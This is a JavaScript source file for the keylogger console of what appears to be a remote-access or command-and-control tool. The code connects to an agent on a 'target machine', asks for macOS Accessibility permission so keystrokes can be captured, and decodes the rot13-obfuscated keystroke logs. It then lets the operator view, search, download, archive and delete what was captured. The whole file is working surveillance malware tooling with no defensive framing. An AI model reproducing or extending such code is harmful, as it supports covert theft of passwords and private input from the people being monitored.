import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
import { checkFeatureAccess } from "./feature-gate.js";

const clientId = window.location.pathname.split("/")[1];
if (!clientId) {
  alert("Missing clientId");
  location.href = "/";
}

const clientLabel = document.getElementById("clientLabel");
const statusPill = document.getElementById("status-pill");
const fileList = document.getElementById("file-list");
const fileListPanel = document.getElementById("file-list-panel");
const permissionGate = document.getElementById("permission-gate");
const permissionStatus = document.getElementById("permission-status");
const requestPermissionBtn = document.getElementById("requestPermissionBtn");
const refreshBtn = document.getElementById("refreshBtn");
const clearBtn = document.getElementById("clearBtn");
const logViewer = document.getElementById("log-viewer");
const logContent = document.getElementById("log-content");
const viewingFilename = document.getElementById("viewing-filename");
const closeViewerBtn = document.getElementById("closeViewerBtn");
const logLines = document.getElementById("log-lines");
const logChars = document.getElementById("log-chars");
const logUpdated = document.getElementById("log-updated");
const searchInput = document.getElementById("searchInput");
const clearSearchBtn = document.getElementById("clearSearchBtn");
const searchNav = document.getElementById("searchNav");
const searchCount = document.getElementById("searchCount");
const prevMatchBtn = document.getElementById("prevMatchBtn");
const nextMatchBtn = document.getElementById("nextMatchBtn");
const searchAllBtn = document.getElementById("searchAllBtn");
const globalSearchModal = document.getElementById("globalSearchModal");
const closeGlobalSearchBtn = document.getElementById("closeGlobalSearchBtn");
const globalSearchInput = document.getElementById("globalSearchInput");
const globalSearchClearBtn = document.getElementById("globalSearchClearBtn");
const globalSearchResults = document.getElementById("globalSearchResults");
const globalSearchStats = document.getElementById("globalSearchStats");
const globalSearchProgress = document.getElementById("globalSearchProgress");
const globalSearchCount = document.getElementById("globalSearchCount");

let ws = null;
let fileIndex = new Map();
let pendingDownload = null;
let currentLogContent = "";
let searchMatches = [];
let currentMatchIndex = -1;
let globalSearchCache = new Map();
let globalSearchAbortController = null;
let clientOs = ""; // filled from the "ready" message
let needsPermissionGate = false; // true for darwin/mac clients
let archiveMode = false;

clientLabel.textContent = clientId;

function updateStatus(className, text) {
  statusPill.className = `pill ${className}`;
  statusPill.textContent = text;
}

function connect() {
  const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
  const wsUrl = `${protocol}//${window.location.host}/api/clients/${clientId}/keylogger/ws`;

  ws = new WebSocket(wsUrl);
  ws.binaryType = "arraybuffer";

  ws.onopen = () => {
    console.log("Keylogger connected");
    updateStatus("pill-online", "Connected");
    // Do NOT request the file list here — wait for the "ready" message which
    // carries clientOs so we know whether to show the macOS permission gate first.
  };

  ws.onmessage = (event) => {
    const msg = decodeMsgpack(event.data);
    if (!msg) {
      console.error("Failed to decode message");
      return;
    }
    handleMessage(msg);
  };

  ws.onerror = (err) => {
    console.error("WebSocket error:", err);
    updateStatus("pill-offline", "Connection Error");
  };

  ws.onclose = () => {
    console.log("Keylogger disconnected");
    updateStatus("pill-offline", "Disconnected");
    setTimeout(() => connect(), 3000);
  };
}

function send(msg) {
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(encodeMsgpack(msg));
  }
}

function isMacOs(os) {
  const s = String(os || "").toLowerCase();
  return s.includes("darwin") || s.includes("mac");
}

function showPermissionGate() {
  permissionGate.classList.remove("hidden");
  fileListPanel.classList.add("hidden");
  permissionStatus.classList.add("hidden");
  requestPermissionBtn.disabled = false;
  requestPermissionBtn.innerHTML = '<i class="fa-solid fa-key"></i><span>Request Accessibility Permission</span>';
}

function showFileListPanel() {
  permissionGate.classList.add("hidden");
  fileListPanel.classList.remove("hidden");
}

function setPermissionStatus(type, text) {
  // type: "success" | "error" | "pending"
  permissionStatus.classList.remove("hidden", "border-green-600", "bg-green-900/30", "text-green-300",
                                     "border-red-600", "bg-red-900/30", "text-red-300",
                                     "border-yellow-600", "bg-yellow-900/30", "text-yellow-300");
  if (type === "success") {
    permissionStatus.classList.add("border-green-600", "bg-green-900/30", "text-green-300");
  } else if (type === "error") {
    permissionStatus.classList.add("border-red-600", "bg-red-900/30", "text-red-300");
  } else {
    permissionStatus.classList.add("border-yellow-600", "bg-yellow-900/30", "text-yellow-300");
  }
  permissionStatus.textContent = text;
}

function handleMessage(msg) {
  console.log("Received:", msg.type);

  switch (msg.type) {
    case "ready":
      archiveMode = msg.clientOnline === false;
      clientOs = msg.clientOs || "";
      needsPermissionGate = isMacOs(clientOs);
      console.log("Keylogger session ready, clientOs:", clientOs, "needsPermissionGate:", needsPermissionGate);
      if (archiveMode) {
        updateStatus("pill-offline", "Archive");
        showFileListPanel();
        loadArchiveList();
        return;
      }
      if (needsPermissionGate) {
        showPermissionGate();
      } else {
        showFileListPanel();
        requestFileList();
      }
      break;
    case "keylog_permission_result":
      requestPermissionBtn.disabled = false;
      if (msg.granted) {
        setPermissionStatus("success", "Permission granted — loading logs...");
        setTimeout(() => {
          showFileListPanel();
          requestFileList();
        }, 800);
      } else {
        let reason;
        if (msg.reason === "keylogger_disabled") {
          reason = "The keylogger is not enabled in this agent build. " +
            "macOS keylogger support requires CGO and must be compiled natively on macOS. " +
            "Rebuild the agent on a macOS host with CGO enabled.";
        } else if (msg.reason === "user_denied") {
          reason = "Permission denied by the user on the target machine.";
        } else {
          reason = msg.reason || "Permission was not granted.";
        }
        setPermissionStatus("error", reason);
        requestPermissionBtn.innerHTML = '<i class="fa-solid fa-key"></i><span>Try Again</span>';
      }
      break;
    case "status":
      if (msg.status === "offline") {
        archiveMode = true;
        updateStatus("pill-offline", "Client Offline");
        showFileListPanel();
        loadArchiveList();
      }
      break;
    case "keylog_file_list":
      displayFileList(msg.files || []);
      break;
    case "keylog_file_content":
      if (pendingDownload && msg.filename === pendingDownload) {
        downloadLog(msg.filename, msg.content);
        pendingDownload = null;
      } else {
        displayFileContent(msg.filename, msg.content);
      }
      break;
    case "keylog_clear_result":
      if (msg.ok) {
        window.showToast("All logs cleared successfully", "success");
        setTimeout(() => {
          window.location.reload();
        }, 1000);
      } else {
        window.showToast(msg.error || "Failed to clear logs", "error");
      }
      break;
    case "keylog_delete_result":
      if (msg.ok) {
        window.showToast(`Deleted ${msg.filename}`, "success");
        requestFileList();
      } else {
        window.showToast(msg.error || "Failed to delete log", "error");
      }
      break;
    case "command_result":
      if (!msg.ok) {
        window.showToast(msg.message || "Command failed", "error");
      }
      break;
    default:
      console.log("Unknown message type:", msg.type);
  }
}

function requestFileList() {
  if (archiveMode) {
    loadArchiveList();
    return;
  }
  send({ type: "keylog_list" });
}

function requestFileContent(filename) {
  if (archiveMode) {
    loadArchiveContent(filename);
    return;
  }
  send({ type: "keylog_retrieve", filename });
}

function requestClearAll() {
  if (archiveMode) return;
  send({ type: "keylog_clear_all" });
}

function requestDeleteFile(filename) {
  if (archiveMode) return;
  send({ type: "keylog_delete", filename });
}

async function loadArchiveList() {
  try {
    const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/keylogger/archive`, { credentials: "include" });
    const data = await res.json().catch(() => ({}));
    if (!res.ok) throw new Error(data.error || "Failed to load archive");
    displayFileList((data.files || []).map((file) => ({ ...file, archived: true })));
  } catch (err) {
    console.error("Failed to load archived keylogs:", err);
    fileList.innerHTML = `
      <div class="text-rose-300 text-center py-8">
        <i class="fa-solid fa-triangle-exclamation text-4xl mb-2"></i>
        <p>Failed to load archived logs</p>
      </div>
    `;
  }
}

async function loadArchiveContent(filename) {
  try {
    const params = new URLSearchParams({ filename });
    const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/keylogger/archive/content?${params.toString()}`, { credentials: "include" });
    const data = await res.json().catch(() => ({}));
    if (!res.ok) throw new Error(data.error || "Failed to load archived file");
    displayFileContent(data.filename || filename, data.content || "");
  } catch (err) {
    console.error("Failed to load archived keylog:", err);
    window.showToast("Failed to load archived log", "error");
  }
}

function downloadLog(filename, content) {
  const decoded = rot13Decode(content || "");
  const blob = new Blob([decoded], { type: "text/plain;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = filename.replace(/\.log$/i, "") + "-decoded.txt";
  document.body.appendChild(link);
  link.click();
  link.remove();
  URL.revokeObjectURL(url);
}

function displayFileList(files) {
  const sortedFiles = (files || []).slice().sort((a, b) => {
    const aTime = a?.date ? new Date(a.date).getTime() : 0;
    const bTime = b?.date ? new Date(b.date).getTime() : 0;
    return bTime - aTime;
  });

  fileIndex = new Map(sortedFiles.map((f) => [f.name, f]));
  if (!sortedFiles || sortedFiles.length === 0) {
    fileList.innerHTML = `
      <div class="text-slate-500 text-center py-8">
        <i class="fa-solid fa-inbox text-4xl mb-2"></i>
        <p>No log files found</p>
      </div>
    `;
    return;
  }

  fileList.innerHTML = sortedFiles
    .map(
      (file) => `
    <div class="group flex items-center justify-between gap-3 p-3 bg-slate-900/60 rounded-lg border border-slate-800 hover:border-slate-600 hover:bg-slate-900/80 transition-colors">
      <div class="flex items-center gap-3">
        <div class="h-10 w-10 rounded-lg bg-yellow-400/10 border border-yellow-500/30 flex items-center justify-center text-yellow-400">
          <i class="fa-solid fa-file-lines"></i>
        </div>
        <div>
          <div class="font-mono text-sm text-slate-100">${escapeHtml(file.name)}</div>
          <div class="flex flex-wrap items-center gap-2 text-xs text-slate-400">
            <span class="inline-flex items-center gap-1 px-2 py-1 rounded bg-slate-800/70 border border-slate-700">
              <i class="fa-solid fa-weight-hanging text-slate-500"></i>
              ${formatBytes(file.size)}
            </span>
            <span class="inline-flex items-center gap-1 px-2 py-1 rounded bg-slate-800/70 border border-slate-700">
              <i class="fa-solid fa-calendar text-slate-500"></i>
              ${formatDate(file.date)}
            </span>
          </div>
        </div>
      </div>
      <div class="flex items-center gap-2">
        ${file.archived ? `
        <span class="px-2 py-1 rounded bg-yellow-900/30 border border-yellow-700 text-yellow-200 text-xs inline-flex items-center gap-1">
          <i class="fa-solid fa-box-archive"></i>
          Archive
        </span>
        ` : ""}
        <button
          class="view-log-btn px-3 py-2 rounded-lg border border-blue-700 bg-blue-900/50 hover:bg-blue-800/70 text-blue-100 flex items-center gap-2"
          data-filename="${escapeHtml(file.name)}"
        >
          <i class="fa-solid fa-eye"></i>
          <span>View</span>
        </button>
        <button
          class="download-log-btn px-3 py-2 rounded-lg border border-emerald-700 bg-emerald-900/40 hover:bg-emerald-800/70 text-emerald-100 flex items-center gap-2"
          data-filename="${escapeHtml(file.name)}"
        >
          <i class="fa-solid fa-download"></i>
          <span>Download</span>
        </button>
        ${archiveMode ? "" : `
        <button
          class="delete-log-btn px-3 py-2 rounded-lg border border-red-700 bg-red-900/40 hover:bg-red-800/70 text-red-100 flex items-center gap-2"
          data-filename="${escapeHtml(file.name)}"
        >
          <i class="fa-solid fa-trash"></i>
          <span>Delete</span>
        </button>
        `}
      </div>
    </div>
  `
    )
    .join("");
}

function displayFileContent(filename, content) {
  logViewer.classList.remove("hidden");
  viewingFilename.textContent = filename;
  const decoded = rot13Decode(content || "");
  currentLogContent = decoded;
  logContent.innerHTML = renderLogHtml(decoded);
  const lineCount = decoded ? decoded.split("\n").length : 0;
  logLines.textContent = `Lines: ${lineCount}`;
  logChars.textContent = `Chars: ${decoded.length}`;
  const meta = fileIndex.get(filename);
  logUpdated.textContent = `Updated: ${meta?.date ? formatDate(meta.date) : "-"}`;
  logContent.scrollTop = 0;
  resetSearch();
}

function renderLogHtml(text) {
  const escaped = escapeHtml(text);
  const withTimestamps = escaped.replace(
    /\[(\d{4}-\d{2}-\d{2}\s\d{2}:\d{2}:\d{2})\]/g,
    '<span class="text-emerald-300">[$1]</span>'
  );
  const withWindowTitles = withTimestamps.replace(
    /\]\s\[([^\]]+?)\](?=\s)/g,
    '] <span class="text-cyan-300 font-semibold">[$1]</span>'
  );
  const withKeys = withWindowTitles.replace(
    /\[(?!\d{4}-\d{2}-\d{2})([^\]]+)\]/g,
    '<span class="text-amber-300">[$1]</span>'
  );
  return withKeys;
}

function rot13Decode(str) {
  return str.replace(/[a-zA-Z]/g, (char) => {
    const start = char <= "Z" ? 65 : 97;
    return String.fromCharCode(
      ((char.charCodeAt(0) - start + 13) % 26) + start
    );
  });
}

function formatBytes(bytes) {
  if (bytes === 0) return "0 B";
  const k = 1024;
  const sizes = ["B", "KB", "MB", "GB"];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return Math.round(bytes / Math.pow(k, i) * 100) / 100 + " " + sizes[i];
}

function formatDate(dateStr) {
  if (!dateStr) return "Unknown";
  const date = new Date(dateStr);
  return date.toLocaleDateString() + " " + date.toLocaleTimeString();
}

function escapeHtml(text) {
  const div = document.createElement("div");
  div.textContent = text || "";
  return div.innerHTML.replace(/"/g, "&quot;").replace(/'/g, "&#39;");
}

function resetSearch() {
  searchInput.value = "";
  searchMatches = [];
  currentMatchIndex = -1;
  clearSearchBtn.classList.add("hidden");
  searchNav.classList.add("hidden");
  if (currentLogContent) {
    logContent.innerHTML = renderLogHtml(currentLogContent);
  }
}

function performSearch(query) {
  if (!query || !currentLogContent) {
    resetSearch();
    return;
  }

  const lowerQuery = query.toLowerCase();
  const lowerContent = currentLogContent.toLowerCase();
  searchMatches = [];

  let index = 0;
  while ((index = lowerContent.indexOf(lowerQuery, index)) !== -1) {
    searchMatches.push(index);
    index += query.length;
  }

  if (searchMatches.length > 0) {
    currentMatchIndex = 0;
    highlightMatches(query);
    scrollToMatch(0);
    updateSearchUI();
  } else {
    logContent.innerHTML = renderLogHtml(currentLogContent);
    searchCount.textContent = "0 / 0";
    searchNav.classList.remove("hidden");
    prevMatchBtn.disabled = true;
    nextMatchBtn.disabled = true;
  }

  clearSearchBtn.classList.remove("hidden");
}

function highlightMatches(query) {
  const escaped = escapeHtml(currentLogContent);
  const regex = new RegExp(escapeRegex(query), "gi");
  let result = escaped.replace(regex, (match, offset) => {
    const matchIndex = searchMatches.indexOf(currentLogContent.toLowerCase().indexOf(match.toLowerCase(), offset));
    const isCurrent = matchIndex === currentMatchIndex;
    return `<mark class="${isCurrent ? 'search-current' : 'search-match'}" data-match-index="${matchIndex}">${match}</mark>`;
  });

  // Apply syntax highlighting
  result = result.replace(
    /\[(\d{4}-\d{2}-\d{2}\s\d{2}:\d{2}:\d{2})\]/g,
    '<span class="text-emerald-300">[$1]</span>'
  );
  result = result.replace(
    /\]\s\[([^\]]+?)\](?=\s)/g,
    '] <span class="text-cyan-300 font-semibold">[$1]</span>'
  );

  logContent.innerHTML = result;
}

function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

function scrollToMatch(index) {
  const marks = logContent.querySelectorAll("mark");
  if (marks[index]) {
    marks[index].scrollIntoView({ behavior: "smooth", block: "center" });
  }
}

function updateSearchUI() {
  searchNav.classList.remove("hidden");
  searchCount.textContent = `${currentMatchIndex + 1} / ${searchMatches.length}`;
  prevMatchBtn.disabled = currentMatchIndex === 0;
  nextMatchBtn.disabled = currentMatchIndex === searchMatches.length - 1;

  // Update highlight classes
  logContent.querySelectorAll("mark").forEach((mark, idx) => {
    if (idx === currentMatchIndex) {
      mark.classList.add("search-current");
      mark.classList.remove("search-match");
    } else {
      mark.classList.remove("search-current");
      mark.classList.add("search-match");
    }
  });
}

function navigateSearch(direction) {
  if (searchMatches.length === 0) return;

  if (direction === "next") {
    currentMatchIndex = Math.min(currentMatchIndex + 1, searchMatches.length - 1);
  } else {
    currentMatchIndex = Math.max(currentMatchIndex - 1, 0);
  }

  scrollToMatch(currentMatchIndex);
  updateSearchUI();
}

searchInput.addEventListener("input", (e) => {
  performSearch(e.target.value);
});

clearSearchBtn.addEventListener("click", () => {
  resetSearch();
});

prevMatchBtn.addEventListener("click", () => {
  navigateSearch("prev");
});

nextMatchBtn.addEventListener("click", () => {
  navigateSearch("next");
});

searchAllBtn.addEventListener("click", () => {
  globalSearchModal.classList.remove("hidden");
  globalSearchInput.focus();
});

closeGlobalSearchBtn.addEventListener("click", () => {
  globalSearchModal.classList.add("hidden");
  if (globalSearchAbortController) {
    globalSearchAbortController.abort();
    globalSearchAbortController = null;
  }
});

globalSearchModal.addEventListener("click", (e) => {
  if (e.target === globalSearchModal) {
    closeGlobalSearchBtn.click();
  }
});

let globalSearchTimeout = null;
globalSearchInput.addEventListener("input", (e) => {
  const query = e.target.value.trim();
  
  if (query.length > 0) {
    globalSearchClearBtn.classList.remove("hidden");
  } else {
    globalSearchClearBtn.classList.add("hidden");
  }

  clearTimeout(globalSearchTimeout);
  
  if (query.length < 3) {
    globalSearchResults.innerHTML = `
      <div class="text-slate-400 text-center py-8">
        <i class="fa-solid fa-magnifying-glass text-4xl mb-2 opacity-50"></i>
        <p>Enter at least 3 characters to search</p>
      </div>
    `;
    globalSearchStats.classList.add("hidden");
    return;
  }

  globalSearchTimeout = setTimeout(() => {
    performGlobalSearch(query);
  }, 300);
});

globalSearchClearBtn.addEventListener("click", () => {
  globalSearchInput.value = "";
  globalSearchClearBtn.classList.add("hidden");
  globalSearchResults.innerHTML = `
    <div class="text-slate-400 text-center py-8">
      <i class="fa-solid fa-magnifying-glass text-4xl mb-2 opacity-50"></i>
      <p>Enter a search term to find across all log files</p>
    </div>
  `;
  globalSearchStats.classList.add("hidden");
});

async function performGlobalSearch(query) {
  if (globalSearchAbortController) {
    globalSearchAbortController.abort();
  }
  globalSearchAbortController = new AbortController();

  if (archiveMode) {
    await performArchivedGlobalSearch(query);
    return;
  }

  const files = Array.from(fileIndex.values());
  const lowerQuery = query.toLowerCase();
  const results = [];

  globalSearchResults.innerHTML = `
    <div class="text-slate-400 text-center py-8">
      <i class="fa-solid fa-spinner fa-spin text-4xl mb-2"></i>
      <p>Searching through ${files.length} files...</p>
    </div>
  `;
  globalSearchStats.classList.remove("hidden");
  globalSearchProgress.textContent = "Searching...";
  globalSearchCount.textContent = "";

  let processedCount = 0;

  for (const file of files) {
    if (globalSearchAbortController.signal.aborted) {
      return;
    }

    try {
      let content = globalSearchCache.get(file.name);
      
      if (!content) {
        content = await loadFileContent(file.name);
        globalSearchCache.set(file.name, content);
      }

      const lowerContent = content.toLowerCase();
      const matches = [];
      let index = 0;

      while ((index = lowerContent.indexOf(lowerQuery, index)) !== -1) {
        const start = Math.max(0, index - 50);
        const end = Math.min(content.length, index + query.length + 50);
        let context = content.substring(start, end);
        
        if (start > 0) context = "..." + context;
        if (end < content.length) context = context + "...";

        matches.push({
          index,
          context,
          line: content.substring(0, index).split("\n").length
        });

        index += query.length;
      }

      if (matches.length > 0) {
        results.push({
          file: file.name,
          date: file.date,
          matches
        });
      }

      processedCount++;
      globalSearchProgress.textContent = `Searched ${processedCount} / ${files.length} files`;

    } catch (err) {
      console.error(`Failed to search ${file.name}:`, err);
    }
  }

  displayGlobalSearchResults(results, query);
}

async function performArchivedGlobalSearch(query) {
  globalSearchResults.innerHTML = `
    <div class="text-slate-400 text-center py-8">
      <i class="fa-solid fa-spinner fa-spin text-4xl mb-2"></i>
      <p>Searching archived logs...</p>
    </div>
  `;
  globalSearchStats.classList.remove("hidden");
  globalSearchProgress.textContent = "Searching archive...";
  globalSearchCount.textContent = "";

  try {
    const params = new URLSearchParams({ q: query });
    const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/keylogger/archive/search?${params.toString()}`, { credentials: "include" });
    const data = await res.json().catch(() => ({}));
    if (!res.ok) throw new Error(data.error || "Search failed");
    displayGlobalSearchResults(data.results || [], query);
  } catch (err) {
    console.error("Archived search failed:", err);
    globalSearchResults.innerHTML = `
      <div class="text-rose-300 text-center py-8">
        <i class="fa-solid fa-triangle-exclamation text-4xl mb-2"></i>
        <p>Archived search failed</p>
      </div>
    `;
    globalSearchProgress.textContent = "Search failed";
    globalSearchCount.textContent = "";
  }
}

function loadFileContent(filename) {
  if (archiveMode) {
    return new Promise(async (resolve, reject) => {
      try {
        const params = new URLSearchParams({ filename });
        const res = await fetch(`/api/clients/${encodeURIComponent(clientId)}/keylogger/archive/content?${params.toString()}`, { credentials: "include" });
        const data = await res.json().catch(() => ({}));
        if (!res.ok) throw new Error(data.error || "Failed to load archived file");
        resolve(rot13Decode(data.content || ""));
      } catch (err) {
        reject(err);
      }
    });
  }

  return new Promise((resolve, reject) => {
    let resolved = false;
    const timeout = setTimeout(() => {
      if (!resolved) {
        reject(new Error("Timeout loading file"));
      }
    }, 10000);

    const handler = (event) => {
      const msg = decodeMsgpack(event.data);
      if (msg && msg.type === "keylog_file_content" && msg.filename === filename) {
        clearTimeout(timeout);
        resolved = true;
        ws.removeEventListener("message", handler);
        resolve(rot13Decode(msg.content || ""));
      }
    };

    ws.addEventListener("message", handler);
    send({ type: "keylog_retrieve", filename });
  });
}

function displayGlobalSearchResults(results, query) {
  const totalMatches = results.reduce((sum, r) => sum + r.matches.length, 0);

  globalSearchProgress.textContent = "Search complete";
  globalSearchCount.textContent = `Found ${totalMatches} matches in ${results.length} files`;

  if (results.length === 0) {
    globalSearchResults.innerHTML = `
      <div class="text-slate-400 text-center py-8">
        <i class="fa-solid fa-circle-xmark text-4xl mb-2 opacity-50"></i>
        <p>No matches found for "${escapeHtml(query)}"</p>
      </div>
    `;
    return;
  }

  const html = results.map(result => `
    <div class="mb-4 bg-slate-800/50 border border-slate-700 rounded-lg p-3">
      <div class="flex items-center justify-between mb-2">
        <div class="flex items-center gap-2">
          <i class="fa-solid fa-file-lines text-yellow-400"></i>
          <span class="font-mono text-sm font-semibold text-slate-200">${escapeHtml(result.file)}</span>
          <span class="text-xs text-slate-400">${formatDate(result.date)}</span>
        </div>
        <span class="text-xs px-2 py-1 rounded bg-blue-900/40 border border-blue-700 text-blue-200">
          ${result.matches.length} match${result.matches.length !== 1 ? 'es' : ''}
        </span>
      </div>
      <div class="space-y-2">
        ${result.matches.slice(0, 5).map((match, idx) => `
          <div class="global-search-result text-xs bg-slate-950/70 border border-slate-700 rounded p-2 font-mono cursor-pointer hover:border-blue-600 transition-colors" 
               data-filename="${escapeHtml(result.file)}" 
               data-query="${escapeHtml(query)}" 
               data-index="${match.index}">
            <div class="text-slate-500 mb-1">Line ${match.line}</div>
            <div class="text-slate-300">${highlightQueryInContext(match.context, query)}</div>
          </div>
        `).join('')}
        ${result.matches.length > 5 ? `
          <div class="text-xs text-slate-400 text-center py-1">
            +${result.matches.length - 5} more matches
          </div>
        ` : ''}
      </div>
    </div>
  `).join('');

  globalSearchResults.innerHTML = html;
}

globalSearchResults.addEventListener("click", (e) => {
  const resultDiv = e.target.closest(".global-search-result");
  if (resultDiv) {
    const filename = resultDiv.dataset.filename;
    const query = resultDiv.dataset.query;
    const targetIndex = parseInt(resultDiv.dataset.index, 10);
    openFileWithSearch(filename, query, targetIndex);
  }
});

function highlightQueryInContext(context, query) {
  const escaped = escapeHtml(context);
  const regex = new RegExp(`(${escapeRegex(query)})`, 'gi');
  return escaped.replace(regex, '<mark class="bg-yellow-400/40 text-yellow-100 px-1 rounded">$1</mark>');
}

function openFileWithSearch(filename, query, targetIndex) {
  globalSearchModal.classList.add("hidden");
  requestFileContent(filename);
  
  setTimeout(() => {
    searchInput.value = query;
    performSearch(query);
    
    if (typeof targetIndex === 'number' && searchMatches.length > 0) {
      setTimeout(() => {
        const matchIdx = searchMatches.indexOf(targetIndex);
        if (matchIdx !== -1) {
          currentMatchIndex = matchIdx;
          scrollToMatch(matchIdx);
          updateSearchUI();
        }
      }, 100);
    }
  }, 500);
}

requestPermissionBtn.addEventListener("click", () => {
  requestPermissionBtn.disabled = true;
  requestPermissionBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i><span>Requesting...</span>';
  setPermissionStatus("pending", "Waiting for user response on the target machine...");
  send({ type: "keylog_request_permission" });
});

refreshBtn.addEventListener("click", () => {
  requestFileList();
  window.showToast(archiveMode ? "Refreshing archive..." : "Refreshing file list...", "info");
});

clearBtn.addEventListener("click", () => {
  if (archiveMode) {
    window.showToast("Archived logs are retained by server policy.", "info");
    return;
  }
  if (
    confirm(
      "Are you sure you want to clear all keylog files? This action cannot be undone."
    )
  ) {
    requestClearAll();
  }
});

closeViewerBtn.addEventListener("click", () => {
  logViewer.classList.add("hidden");
});

fileList.addEventListener("click", (event) => {
  const target = event.target.closest("button");
  if (!target) return;
  const filename = target.dataset.filename;
  if (!filename) return;

  if (target.classList.contains("view-log-btn")) {
    requestFileContent(filename);
    return;
  }

  if (target.classList.contains("download-log-btn")) {
    pendingDownload = filename;
    requestFileContent(filename);
    return;
  }

  if (target.classList.contains("delete-log-btn")) {
    if (confirm(`Delete ${filename}? This cannot be undone.`)) {
      requestDeleteFile(filename);
    }
  }
});

import("/assets/nav.js");
checkFeatureAccess("keylogger", clientId).then(ok => ok && connect());
